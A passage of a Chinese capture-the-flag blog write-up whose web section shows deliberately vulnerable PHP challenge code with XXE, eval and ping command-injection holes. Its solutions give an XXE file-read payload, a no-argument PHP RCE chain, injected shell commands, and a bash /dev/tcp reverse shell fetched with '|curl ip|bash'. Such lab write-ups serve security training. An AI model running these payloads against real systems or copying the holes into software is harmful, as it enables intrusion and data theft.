class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;请输入姓名&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解题思路</p>
+<p>xxe外部实体注入+伪协议读取源码</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;feedback&gt;</span><br><span class="line">&lt;author&gt;&amp;xxe;&lt;/author&gt;</span><br><span class="line">&lt;/feedback&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓包改一下，再base64解密即可得到flag</p>
+<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>过滤诸多，将常用的数组控制函数给ban了，session也ban了，文件显示的<strong>show_souce</strong>以及<strong>highlight_file</strong>也没了，能用的函数查阅完，最终有个控制数组的随机数函数<strong>array_rand</strong>以及文件<strong>file_get_contents</strong>，选择当前目录的函数有个<strong>current</strong>组合起来就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>但是后边又过滤了flag，而flag在flag.php，读到就会die掉，所以需要加密，常用的加密base64已经被过滤了，选择使用十六进制加密，最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
+
+<p>读取的时候有些文件也会被读取进来，因为是随机读取，每次出现不一样的十六进制，都需要多解密看看，解密代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="string">&quot;3c3f7068700d0a2f2f666c61677b31353166306361642d376338322d346164312d383230332d3536636333366461393564307d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解开得flag</p>
+<h3 id="神奇的输入框"><a href="#神奇的输入框" class="headerlink" title="神奇的输入框"></a>神奇的输入框</h3><p>这道题是一道无回显的ping命令</p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">            <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>解法一</li>
+</ul>
+<p>利用<code>&gt;</code>把我们需要执行的命令写入文件里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问1.txt然后看到flagggg.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat flagggg.php&gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者反引号执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat flagggg.php&gt; 1.txt&#96;</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<ul>
+<li>解法二</li>
+</ul>
+<p>直接反弹一个shell</p>
+<p>在vps监听1234端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>在vps的/var/www/html写入bash反弹语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后回到输入框下输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl ip|bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120730923.png" alt="image-20201119120730923"></p>
+<p>tips：因为docker靶机的环境问题可能无法写shell，以及无法使用dnslog外带数据。</p>
+<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>弱口令admin/admin8888登录后台</p>
+<ul>
+<li>解法一</li>
+</ul>
+<p>文件包含漏洞</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132632586.png" alt="image-20201119132632586"></p>
+<p>插入php代码</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132855855.png" alt="image-20201119132855855"></p>
+<p>改一下页面</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133034032.png" alt="image-20201119133034032"></p>
+<p>然后点击前台的关于我们</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133206501.png" alt="image-20201119133206501"></p>
+<p>点进去即可获得flag</p>
+<ul>
+<li>其他解法</li>
+</ul>
+<p>百度xiaocms漏洞，有现成的getshell方法</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/14/%E5%A4%AA%E6%B9%96%E6%9D%AF/" rel="prev" title="太湖杯">
+      <i class="fa fa-chevron-left"></i> 太湖杯
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A8%E7%99%BD"><span class="nav-number">2.1.</span> <span class="nav-text">表白</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LSB"><span class="nav-number">2.2.</span> <span class="nav-text">LSB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%81%E7%83%9F%E6%9E%AA"><span class="nav-number">2.3.</span> <span class="nav-text">老烟枪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%A0%B4%E8%A7%A3%E5%90%97"><span class="nav-number">2.4.</span> <span class="nav-text">你能破解吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#disk0"><span class="nav-number">2.5.</span> <span class="nav-text">disk0</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%AF%E6%92%92%E5%B0%86%E5%86%9B"><span class="nav-number">3.1.</span> <span class="nav-text">凯撒将军</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%98%8E%E5%AE%B6%E7%9A%84%E5%B0%8F%E8%8F%9C%E5%9B%AD"><span class="nav-number">3.2.</span> <span class="nav-text">小明家的小菜园</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%98%E6%8A%A5"><span class="nav-number">3.3.</span> <span class="nav-text">战报</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">4.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#G2mtu%E5%AD%A6%E7%94%9F%EF%BC%9F"><span class="nav-number">4.1.</span> <span class="nav-text">G2mtu学生？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Who-are-you"><span class="nav-number">4.2.</span> <span class="nav-text">Who are you?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="nav-number">4.3.</span> <span class="nav-text">无参数RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%9E%E5%A5%87%E7%9A%84%E8%BE%93%E5%85%A5%E6%A1%86"><span class="nav-number">4.4.</span> <span class="nav-text">神奇的输入框</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMS"><span class="nav-number">4.5.</span> <span class="nav-text">CMS</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description">PHP是世界上最好的语言</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://47.98.234.232:8000/" title="http:&#x2F;&#x2F;47.98.234.232:8000&#x2F;" rel="noopener" target="_blank">G2mtu备用靶场</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kawhi.gearhostpreview.com/" title="http:&#x2F;&#x2F;kawhi.gearhostpreview.com&#x2F;" rel="noopener" target="_blank">OneDrive网盘</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">269k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:05</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
